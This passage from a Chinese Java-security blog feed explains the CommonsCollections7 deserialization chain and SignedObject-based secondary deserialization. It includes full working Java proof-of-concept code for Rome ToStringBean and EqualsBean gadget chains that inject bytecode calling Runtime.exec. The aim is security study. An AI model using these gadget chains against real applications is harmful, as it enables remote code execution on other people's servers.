class="string">&quot;yy&quot;</span>);</span><br></pre></td></tr></table></figure><h4 id="问题1">问题1</h4><p>从poc中我们可以看到进行了Hashtable两次put而且都是相同的key，为什么要这样做？我们直接看其readObject方法就不倒着调试了。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714747290107-e9dba1e1-7eb7-400b-9db5-a354fc864189.png" alt=""></p><p>lements代表键值对的个数，我们创建Hashtable时传入了两个键值对，故elements=2</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714749474176-5dc0367a-abcf-4683-b2e0-05dc99129ba2.png" alt=""></p><p>可以看到在readObject中的for循环里读出了序列化写进去的key 和 value值 这里可以看到第一次循环获取的是第一次hashtable put的key 和 value值然后跟到reconstitutionPut方法看看<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714749848646-ff4fe199-d812-4d22-a3e0-6bdd7b093fdd.png" alt=""></p><p>从调试信息以及代码可以看出第一次for循环是没有进去的，是因为这里的tab是空的所以没法进入，而我们发现他在后面又直接将我们传入过来的key（第一个传入的lazymap） 和 value  （值为1）又直接实例化到tab里面了。</p><p>所以继续跟进：</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714750203246-2fbb6072-69fd-4cf7-8027-f769d544af3d.png" alt=""></p><p>等到第二次传进来的值的时候就可以进入for循环了，这就是为什么我们需要两次传入同样的key，这时会在for循环里调用e.key也就等于LazyMap对象（第一次传入的）的equals方法并且传入的参数key也是LazyMap对象是第二次hashtable put进来的，但是这里有一个问题是我们去查看LazyMap并没有发现equals方法，于是我们去找他的父类发现在AbstractMapDecorator这个抽象类里实现了equals方法我们继续跟进看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714750240472-95a635f2-3388-484b-baae-be078165c16c.png" alt=""></p><p>这里我们知道LazyMap也是put两个一样的key是hashmap对象所以这里会调用hashmap的equals方法</p><p>但是同样他也没有equals方法所以直接到它的父类AbstractMap里看<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714750954087-89e308f6-13bd-4644-a736-49c0865a9e0b.png" alt=""></p><p>此时value并不为空所以进入到equals方法中且调用了get方法，此时的m就是第二次put进来的LazyMap对象，</p><p>所以也就触发了rce（后续一系列的过程跟其它lazymap很像）就不再一一跟了。</p><p>补充说明：这里分析的有点问题，这里涉及到hash碰撞的问题建议先参考：<a href="https://www.anquanke.com/post/id/248169#h3-4">https://www.anquanke.com/post/id/248169#h3-4</a></p><p><a href="http://myblog.ac.cn/archives/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcommoncollections7%E5%88%A9%E7%94%A8%E9%93%BE#%E6%8E%A7%E5%88%B6%E5%93%88%E5%B8%8C%EF%BC%88%E9%87%8D%E7%82%B9%EF%BC%89">http://myblog.ac.cn/archives/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcommoncollections7%E5%88%A9%E7%94%A8%E9%93%BE#%E6%8E%A7%E5%88%B6%E5%93%88%E5%B8%8C%EF%BC%88%E9%87%8D%E7%82%B9%EF%BC%89</a></p><h4 id="问题2">问题2</h4><p>为什么要反射修改ChainedTransformer的属性值</p><p>经过调试我们发现在hashtable对象进行put的时候也会调用到equals方法具体参照问题1的分析</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714751842043-cbf6e4df-fb01-4188-ba28-8094371979c3.png" alt=""></p><p>所以在序列化之前我们先传一个不能够执行命令的invokertransformer对象。</p><h4 id="问题3">问题3</h4><p>为什么要删除laymap2中的key值呢，其实这里我们可以参考cc6链中为什么在序列化之前移除key一样，因为lazyMap执行get方法需要保证不存在这个值<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714755545755-24aa5aa4-28c7-4d7a-9249-ed093b81390d.png" alt=""></p><p>而我们通过参考<a href="https://www.anquanke.com/post/id/248169#h2-6">https://www.anquanke.com/post/id/248169#h2-6</a>文章和自己调试也发现我们在进行put的时候也会调用上面所分析的一系列方法导致最后put时最后调用get的时候我们会传入yy方法此时呢map对象是lazymap2其中是没有yy的值的但是</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714755927376-4f63cbbb-0a50-40fb-8e30-2de226e52b77.png" alt=""></p><p>我们发现他会put进去，所以我们需要在序列化之前将其值删除掉，这样在反序列化的时候我们才能进入判断条件从而调用transform方法。</p><p>cc7调用链</p><p>直接贴原作的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">java.util.Hashtable.readObject</span><br><span class="line">    java.util.Hashtable.reconstitutionPut</span><br><span class="line">    org.apache.commons.collections.map.AbstractMapDecorator.equals</span><br><span class="line">    java.util.AbstractMap.equals</span><br><span class="line">    org.apache.commons.collections.map.LazyMap.get</span><br><span class="line">    org.apache.commons.collections.functors.ChainedTransformer.transform</span><br><span class="line">    org.apache.commons.collections.functors.InvokerTransformer.transform</span><br><span class="line">    java.lang.reflect.Method.invoke</span><br><span class="line">    sun.reflect.DelegatingMethodAccessorImpl.invoke</span><br><span class="line">    sun.reflect.NativeMethodAccessorImpl.invoke</span><br><span class="line">    sun.reflect.NativeMethodAccessorImpl.invoke0</span><br><span class="line">    java.lang.Runtime.exec</span><br></pre></td></tr></table></figure><h2 id="java-cc11链">java cc11链</h2><p>参考：<a href="https://drun1baby.top/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/#2-%E6%89%BE%E9%93%BE%E5%AD%90">https://drun1baby.top/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/#2-%E6%89%BE%E9%93%BE%E5%AD%90</a></p><p><a href="http://wjlshare.com/archives/1536">http://wjlshare.com/archives/1536</a></p><h2 id="JRMP反序列化">JRMP反序列化</h2><p>这里来聊聊jrmp反序列化起因是今天打泽鹿的一个车联网的一道题shiro反序列化绕过用到了这个jrmp，当时直接用工具梭的并不知道其原理，赛后我们来学习一下当作记录。</p><p>这里可以参考我在rmi原理中记录的文章就没有自己写。</p><p>也可以参考这个文章：<a href="https://boogipop.com/2024/02/29/Ysoserial%20JRMPListener_Client%20Review/#Summary">https://boogipop.com/2024/02/29/Ysoserial%20JRMPListener_Client%20Review/#Summary</a></p><p><a href="https://mp.weixin.qq.com/s/tlqNfOGUMdX0ionGBP2DeQ">https://mp.weixin.qq.com/s/tlqNfOGUMdX0ionGBP2DeQ</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/14333695.html">https://www.cnblogs.com/nice0e3/p/14333695.html</a></p><p><a href="https://xz.aliyun.com/t/12780?time__1311=GqGxu7G%3DqCwxlrzG77DODciRF9lmioD">https://xz.aliyun.com/t/12780?time__1311=GqGxu7G%3DqCwxlrzG77DODciRF9lmioD</a></p><p><a href="https://lalajun.github.io/2020/06/22/RMI%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%B7%B1%E5%85%A5-%E4%B8%8B/#%E5%89%8D%E8%A8%80">https://lalajun.github.io/2020/06/22/RMI%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%B7%B1%E5%85%A5-%E4%B8%8B/#%E5%89%8D%E8%A8%80</a></p><h2 id="深入java序列化和反序列化">深入java序列化和反序列化</h2><p><a href="https://blog.csdn.net/Leon_cx/article/details/81517603">https://blog.csdn.net/Leon_cx/article/details/81517603</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;可以看一下这两篇分析java序列化和反序列化的执行流程。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnpanda.net/sec/893.html&quot;&gt;https://www.cnpanda.net/sec/893.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a hre</summary>
      
    
    
    
    <category term="Java安全" scheme="https://oceanzbz.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="反序列化" scheme="https://oceanzbz.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="CC链" scheme="https://oceanzbz.github.io/tags/CC%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>二次反序列化</title>
    <link href="https://oceanzbz.github.io/post/435b9f88.html"/>
    <id>https://oceanzbz.github.io/post/435b9f88.html</id>
    <published>2024-12-30T06:12:43.000Z</published>
    <updated>2025-03-05T07:24:36.800Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SignedObject">SignedObject</h2><p>他是<code>java.security</code>下一个用于创建真实运行时对象的类，更具体地说，<code>SignedObject</code>包含另一个<code>Serializable</code>对象。主要是来看他的getObject方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735218775514-955d3ece-aa81-4353-a226-4e506d7ec38c.png" alt=""></p><p>可以看到该方法中存在一个readObject方法可以进行反序列化，可以看到他反序列化的内容来自content而这个值我们是可控的看他的构造方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735219090639-0c41c5db-990c-46be-ba40-874409d44e70.png" alt=""></p><p>其构造方法会将第一个参数序列化，然后赋值给<code>content</code>属性，<code>SignedObject</code>的<code>getObject</code>方法会将<code>content</code>属性反序列化</p><p>利用方式如下：先构造一个恶意<code>SignedObject</code>，然后调用它的<code>getObject()</code>方法即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">kpg.initialize(<span class="number">1024</span>);</span><br><span class="line"><span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line"><span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(恶意对象 用于第二次反序列化, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br></pre></td></tr></table></figure><p>利用思路：</p><ul><li>谁的方法调用了<code>getObject</code>方法，然后一直往上跟readobject或者getter方法</li><li>谁的反射可控，直接进行反射调用</li></ul><p>通过对网上师傅的一些学习可以知道 fastjson jackson cb Rome可以触发getter方法，下面逐一来看一下</p><h2 id="Rome">Rome</h2><p>具体执行原理参考<a href="https://www.yuque.com/zqiangweihuakai/ybltae/ifbslse58xxxv3ni">Rome反序列化</a>记录还算可以。</p><h3 id="ToStringBean链">ToStringBean链</h3><p>这里主要关注其二次反序列化的点，看一下poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.time.temporal.Temporal;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rome_SignedObject_twice</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> CtClass <span class="title function_">getEvilClass</span><span class="params">()</span> <span class="keyword">throws</span> CannotCompileException, NotFoundException &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ct</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;</span>;</span><br><span class="line">        ct.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        ct.setName(randomClassName);</span><br><span class="line">        ct.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="keyword">return</span> ct;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">getPayload</span><span class="params">(Class clazz, Object obj)</span> &#123;</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(clazz, obj));</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(objectBean, <span class="string">&quot;rand&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Unser</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchAlgorithmException, IOException, SignatureException, InvalidKeyException, NotFoundException, CannotCompileException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[][] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;getEvilClass().toBytecode()&#125;;</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_bytecodes&quot;</span>, bytes);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;x&quot;</span>);</span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap1</span> <span class="operator">=</span> getPayload(Templates.class, templatesImpl);</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(hashMap1, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap2</span> <span class="operator">=</span> getPayload(SignedObject.class, signedObject);</span><br><span class="line">        Unser(hashMap2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>大概的流程是这样的：<code>hashMap2:readObject()-&gt;signedObject:getObject-&gt;hashMap1:readObject</code></p><h3 id="EqualsBean链">EqualsBean链</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rome_SignedObject_EqualsBean_twice</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> CtClass <span class="title function_">getEvilClass</span><span class="params">()</span> <span class="keyword">throws</span> CannotCompileException, NotFoundException &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ct</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;</span>;</span><br><span class="line">        ct.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        ct.setName(randomClassName);</span><br><span class="line">        ct.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="keyword">return</span> ct;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Unser</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Hashtable <span class="title function_">getPayload</span><span class="params">(Class clazz, Object obj)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(String.class, <span class="string">&quot;s&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map1.put(<span class="string">&quot;yy&quot;</span>, bean);</span><br><span class="line">        map1.put(<span class="string">&quot;zZ&quot;</span>, obj);</span><br><span class="line">        map2.put(<span class="string">&quot;zZ&quot;</span>, bean);</span><br><span class="line">        map2.put(<span class="string">&quot;yy&quot;</span>, obj);</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">table</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        table.put(map1, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        table.put(map2, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">        setFieldValue(bean, <span class="string">&quot;_beanClass&quot;</span>, clazz);</span><br><span class="line">        setFieldValue(bean, <span class="string">&quot;_obj&quot;</span>, obj);</span><br><span class="line">        <span class="keyword">return</span> table;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchAlgorithmException, NotFoundException, CannotCompileException, NoSuchFieldException, IllegalAccessException, IOException, SignatureException, InvalidKeyException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[][] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;getEvilClass().toBytecode()&#125;;</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_bytecodes&quot;</span>, bytes);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;x&quot;</span>);</span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">table1</span> <span class="operator">=</span> getPayload(Templates.class, templatesImpl);</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(table1, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">table2</span> <span class="operator">=</span> getPayload(SignedObject.class, signedObject);</span><br><span class="line">        Unser(table2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="commons-beanutils链">commons-beanutils链</h2><p>具体原理参考<a href="https://www.yuque.com/zqiangweihuakai/ybltae/gpgxvbbuk5ughk6w">Java 反序列化</a>这里有介绍cb链的原理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 